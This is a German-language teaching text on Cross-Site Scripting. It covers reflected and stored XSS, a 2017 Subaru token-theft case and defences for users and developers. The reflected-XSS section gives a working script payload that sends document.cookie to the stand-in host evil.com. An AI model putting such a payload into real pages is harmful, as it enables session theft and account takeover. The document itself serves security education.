# Cross-Site Scripting (XSS)

## 1. Einleitung und Definition

**Cross-Site Scripting (XSS)** ist eine der am häufigsten auftretenden Schwachstellen in Webanwendungen.  
Der Begriff stammt ursprünglich aus einem Kontext, in dem Schwachstellen im Browser es ermöglichten, Inhalte zwischen verschiedenen Websites zu manipulieren.

XSS-Angriffe nutzen das Vertrauen eines Webbrowsers gegenüber einer bestimmten Website aus, um **bösartigen JavaScript-Code** auszuführen.

> XSS ≠ CSS (Cascading Style Sheets) – obwohl die Abkürzung ähnlich klingt.

### Warum JavaScript?

Die Mehrheit aller XSS-Angriffe nutzt JavaScript, da es in den meisten Browsern aktiviert ist und weitreichende Möglichkeiten zur Interaktion mit Webseiten bietet.

---

## 2. Funktionsweise eines XSS-Angriffs (Überblick)

Ein typischer XSS-Angriff involviert drei Beteiligte:

- **Angreifer**
- **Opfer (z. B. Endnutzer)**
- **Vertrauenswürdige Zielseite**

### Ablauf:

1. **Der Angreifer sendet einen bösartigen Link**  
   (z. B. per E-Mail, SMS, Kommentar oder Chat).

2. **Das Opfer klickt auf den Link**, der zu einer legitimen Website führt, jedoch einen eingebetteten, unsichtbaren Skriptanteil enthält.

3. **Das Skript wird im Browser des Opfers ausgeführt** und sendet z. B. Cookies, Session-Tokens oder andere sensible Informationen an den Angreifer.

---

## 3. Arten von XSS-Angriffen

### 3.1 Nicht-persistentes (Reflektiertes) XSS

**Beschreibung:**  
Das bösartige Skript ist nicht dauerhaft gespeichert, sondern wird über die URL oder Formularfelder an die Website übergeben und **sofort reflektiert**.

**Ablauf:**

- Angreifer entdeckt eine Schwachstelle (z. B. im Suchfeld)
- Er erstellt eine URL mit schädlichem Skript
- Opfer klickt auf den Link
- Die Antwortseite enthält das Skript, das direkt im Browser des Opfers ausgeführt wird

**Beispiel:**  
Ein Suchformular auf einer Website akzeptiert Eingaben ohne Prüfung.  
Der Angreifer sendet:  
```html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

---

### 3.2 Persistentes (Gespeichertes) XSS

**Beschreibung:**  
Hier wird der bösartige Code **dauerhaft auf dem Server gespeichert**, z. B. in einem Forum, Kommentarbereich oder Nutzerprofil.

**Ablauf:**

- Angreifer postet JavaScript-Code auf der Website
- Jeder Besucher der Seite lädt und führt diesen Code automatisch aus
- Es erfolgt keine Interaktion mehr durch das Opfer – die Ausführung ist passiv

**Gefahr:**  
Ein einziger Angriff kann viele Benutzer gleichzeitig betreffen („Wurm-artige Verbreitung“).

> „All viewers of that information will have that JavaScript run inside their local browser.“

---

## 4. Fallstudie: XSS-Schwachstelle auf der Subaru-Website (Juni 2017)

**Entdeckung:**  
Sicherheitsforscher *Aaron Guzman* identifizierte eine kritische Schwachstelle auf der Subaru-Fahrzeugverwaltungsplattform.

### Schwachstellen im Detail:

- **Nicht ablaufendes Token:**  
  Nach Login wurde ein Authentifizierungstoken generiert, das **niemals ablief** – was gegen Sicherheitsstandards verstößt.

- **Vollzugriff mit Token:**  
  Das Token ermöglichte vollständigen Zugriff auf Fahrzeugfunktionen (z. B. Service-Anfragen, Fahrzeugdaten).

- **E-Mail-Manipulation:**  
  Der Angreifer konnte seine E-Mail zu fremden Accounts hinzufügen und so **dauerhaften Zugriff** erlangen.

- **Verknüpfung mit XSS:**  
  Über eine XSS-Schwachstelle konnte ein Angreifer einem Opfer einen manipulierten Link zusenden.  
  Klickte das Opfer darauf, konnte der Angreifer das gültige Token abfangen und missbrauchen.

> „This is effectively a single token that allows an attacker full access to anyone's vehicle that may be registered on the Subaru website.“

**Ergebnis:**  
Der Angreifer konnte das Fahrzeug eines beliebigen Subaru-Nutzers kontrollieren.

**Lösung:**  
Die Schwachstelle wurde gemeldet und durch Subaru behoben.

---

## 5. Schutzmaßnahmen gegen XSS-Angriffe

### 5.1 Für Anwender

- **Misstrauen bei Links:**  
  Keine Links anklicken, denen man nicht ausdrücklich vertraut.

- **Direkte Navigation:**  
  Webseiten direkt im Browser öffnen – nicht über Links aus E-Mails oder Nachrichten.

- **JavaScript einschränken:**  
  Verwendung von Add-ons (z. B. NoScript). Achtung: Dies kann Funktionalität beeinträchtigen.

- **Software aktuell halten:**  
  Browser und Anwendungen regelmäßig updaten – Hersteller beheben bekannte XSS-Lücken über Patches.

---

### 5.2 Für Entwickler

- **Input-Validierung:**  
  Alle Benutzereingaben **gründlich prüfen und filtern** – insbesondere in Formularen, URLs, Query-Parametern und HTTP-Headern.

> „You need to make sure that all of the inputs to your application are checked to make sure that a user can't add their own script to any of these input fields.“

- **Output-Encoding:**  
  Dynamisch ausgegebene Inhalte sollten sicher „escaped“ werden, bevor sie im Browser angezeigt werden.

- **Content Security Policy (CSP):**  
  Reduziert die Auswirkungen erfolgreicher Angriffe durch Einschränkung, welche Skripte ausgeführt werden dürfen.

- **Prepared Statements / Templates verwenden:**  
  Kein dynamisches Einfügen von HTML oder JavaScript aus Benutzereingaben.

---

## Fazit

Cross-Site Scripting ist eine **ernstzunehmende Sicherheitsbedrohung**, die weit verbreitet und schwer zu erkennen ist.  
Ein sorgfältiger Umgang mit Benutzereingaben sowie aktuelle Schutzmechanismen im Browser und im Backend-Code sind essenziell.

**XSS steht regelmäßig auf Platz 1–3 der OWASP Top 10 Webanwendungsschwachstellen.**

Ein fundiertes Verständnis dieser Angriffsform ist für Entwickler und IT-Sicherheitsverantwortliche unverzichtbar.
